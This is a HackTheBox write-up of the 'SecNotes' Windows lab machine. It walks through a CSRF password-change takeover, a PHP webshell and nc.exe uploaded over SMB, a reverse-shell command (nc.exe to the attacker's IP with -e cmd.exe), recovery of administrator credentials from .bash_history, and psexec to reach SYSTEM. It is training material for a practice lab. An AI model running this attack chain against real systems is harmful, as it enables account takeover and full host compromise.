## Secnotes@HackTheBox


**Machine Details**

SecNotes is a Windows machine that is running IIS web server on Ports 80 and 8808. The initial foothold is made by an XRSF attack against the webadmin admin, "Tyler", who clicks a link that we craft to change the password to his account. Once the link is clicked, we login to his account and see there are some credentials for an SMB account with a share that we have READ/WRITE privileges. We then upload a shell and netcat to get a reverse shell.
Once we have a reverse shell, browsing to Tyler's desktop exposes a .lnk file linking to bash.exe that is missing, after searching for the missing bash.exe we find it in a different directory, executing it spawns a bash shell with root privileges. Once spawned into the bash shell, reading .bash_history exposes Administrator's credentials which can be used multiple ways. I used psexec.py to spawn a root shell and get the root flag.

# Recon

**Full TCP Port Scan**

`nmap -sC -sV -v -p- -A secnotes.htb`
```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
```
# Exploitation 

**Port 80**

We know the admin's username is tyler:

- There is a header when you login telling you to contact tyler@secnotes.htb with any questions.
- Trying to login to user "admin" returns "invalid username", logging in with user "tyler" returns "invalid password"
<img width="1020" alt="image" src="https://user-images.githubusercontent.com/58801175/182289496-ba3d89a4-b0db-47ca-83e7-7794969009d6.png">

Looking deeper into the webapp, the change_pass.php page doesn't ask you to confirm your current password before changing your password. Which could mean it's vulnerable to a CSRF attack.

**Using CSRF to take over tyler's account using change_pass.php**

In order to create a CSRF payload we need to know all the parameters for the request we want to forge.
Capturing the request to change the password to my test account shows there are 3 parameters: `password=asdsad&confirm_password=asdasd&submit=submit`

```
POST /change_pass.php HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://10.10.10.97
Connection: close
Referer: http://10.10.10.97/change_pass.php
Cookie: PHPSESSID=grafdstet4gnivi29gbglt9de0
Upgrade-Insecure-Requests: 1

password=asdsad&confirm_password=asdasd&submit=submit
```

Now we have the parameters, let's make the payload.
PoC: [http://10.10.10.97/change\_pass.php?password=hacked&confirm\_password=hacked&submit=submit](http://10.10.10.97/change_pass.php?password=hacked&confirm_password=hacked&submit=submit)

This is the link I'll send through the contact form. If Tyler or anybody else clicks it, their password will be changed to "hacked".
Submit the link through the contact form located at http://secnotes.htb/contact.php and wait for Tyler to click it.

I waited about 30 seconds and tried to login to Tyler's account using `tyler:hacked` and it worked.
We now have access to tyler's secure notes.

Opening the "new site" note reveals some credentials and what looks to be an smbshare.

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```



**SMB/Port 445**

Using smbmap to check the privileges with tyler's account
note: using single quotes to wrap the password in allows us to bypass the exclamation mark which bash terminals interpret it as "Not" (like in boolean)

```
smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'                2 ⨯
[+] IP: 10.10.10.97:445	Name: 10.10.10.97                                       
        Disk                                                  	Permissions	Comment
    ----                                                  	-----------	-------
    ADMIN$                                            	NO ACCESS	Remote Admin
    C$                                                	NO ACCESS	Default share
    IPC$                                              	READ ONLY	Remote IPC
    new-site                                          	READ, WRITE
```

We have READ/WRITE on new-site and READ on IPC$ shares.

Enumerating `new-site` share.
```
smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&' -r "new-site"
[+] IP: 10.10.10.97:445	Name: 10.10.10.97                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	new-site                                          	READ, WRITE	
	.\new-site\*
	dr--r--r--                0 Mon Aug  1 14:17:30 2022	.
	dr--r--r--                0 Mon Aug  1 14:17:30 2022	..
	fr--r--r--              696 Thu Jun 21 13:15:36 2018	iisstart.htm
	fr--r--r--            98757 Thu Jun 21 13:15:38 2018	iisstart.png
```
There's nothing of interest in there, but we know the new site is running on Port 8808 from browsing to it earlier we saw the default IIS page.
The site running on port 80 is using php, I'll assume port 8808 is also using php. 
Let's test the theory that the new-site is running on port 8808
Upload test.txt and curl it.
```
echo test > test.txt
fg
put test.txt
└─# curl http://10.10.10.97:8808/test.txt
test
```

The theory seems to be true, time to upload a shell.

Uploading shell via smb
Shell used: https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php

Upload nc.exe
```
└─#  cp /usr/share/windows-resources/binaries/nc.exe .                                                                         1 ⚙
                                                                                                                                   
┌──(root💀kali)-[~/…/secnotes/exploitation]
└─# fg                                                                                                                         1 ⚙
[1]  + continued  smbclient -H \\\\10.10.10.97\\new-site -U tyler
put nc.exe 
putting file nc.exe as \nc.exe (133.3 kb/s) (average 66.4 kb/s)
smb: \> 
```

Open a listener on the attacking machine and execute nc.exe using the webshell to connect back to it.
```
└─# nc -lnvp 1337
listening on [any] 1337 ...
```
http://10.10.10.97:8808/shell.php?cmd=nc.exe+10.10.14.11+1337+-e+cmd.exe
```
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.97] 50700
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
```

# Privilege Escalation

**From user tyler to root, and from root to system**

There is a link to bash on tyler's desktop
```
dir
Directory of C:\Users\tyler\Desktop

08/19/2018  03:51 PM    <DIR>          .
08/19/2018  03:51 PM    <DIR>          ..
06/22/2018  03:09 AM             1,293 bash.lnk
08/02/2021  03:32 AM             1,210 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
08/01/2022  02:49 PM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,965 bytes
               2 Dir(s)  13,660,639,232 bytes free

```
We can see where it points to be executing 
`type bash.lnk`
![image](https://user-images.githubusercontent.com/58801175/182289978-56a357a2-4947-4c8d-9a20-6ba141e929b9.png)

bash.lnk points to C:\windows\system32\bash.exe, which doesn't exist.

Locating bash.exe
`dir /s bash.exe`
```
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5

06/21/2018  03:02 PM           115,712 bash.exe
               1 File(s)        115,712 bytes

     Total Files Listed:
               1 File(s)        115,712 bytes
               0 Dir(s)  13,660,495,872 bytes free

```

Bash.exe is located at `C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5`

`dir C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5`
```
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5

06/21/2018  03:02 PM    <DIR>          .
06/21/2018  03:02 PM    <DIR>          ..
06/21/2018  03:02 PM           115,712 bash.exe
               1 File(s)        115,712 bytes
               2 Dir(s)  13,660,495,872 bytes free
```


**Gaining root by executing bash.exe**
```
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
whoami
root
```

Found administrator credentials in .bash_history
```
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
```

**System shell using psexec.py**

`python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.97`
```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password: u6!4ZwgwOM#^OBf#Nwnh
[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file XCbGWYgT.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service OhSz on 10.10.10.97.....
[*] Starting service OhSz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```




